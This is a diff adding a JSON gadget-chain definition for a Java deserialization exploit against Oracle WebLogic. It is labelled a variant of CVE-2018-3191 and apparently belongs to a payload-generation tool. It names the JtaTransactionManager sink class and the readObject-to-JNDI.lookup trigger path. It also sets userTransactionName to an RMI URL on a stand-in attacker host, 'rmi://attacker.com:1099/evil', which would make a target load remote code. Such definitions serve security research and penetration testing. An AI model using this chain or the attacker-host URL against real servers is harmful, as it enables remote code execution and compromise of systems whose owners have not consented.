@@ -1,0 +1,18 @@
+{
+  "chain_type": "direct_chain",
+  "description": "WebLogic3: BEA JtaTransactionManager JNDI injection (CVE-2018-3191 variant)",
+  "root_class": "com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager",
+  "root_trigger": "readObject→initUserTransactionAndTransactionManager→lookupUserTransaction→JNDI.lookup",
+  "links": [
+    {
+      "class": "com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager",
+      "role": "sink",
+      "field_overrides": {
+        "userTransactionName": "rmi://attacker.com:1099/evil",
+        "autodetectUserTransaction": false,
+        "autodetectTransactionManager": false
+      }
+    }
+  ],
+  "sink_method": "InitialContext.lookup"
+}
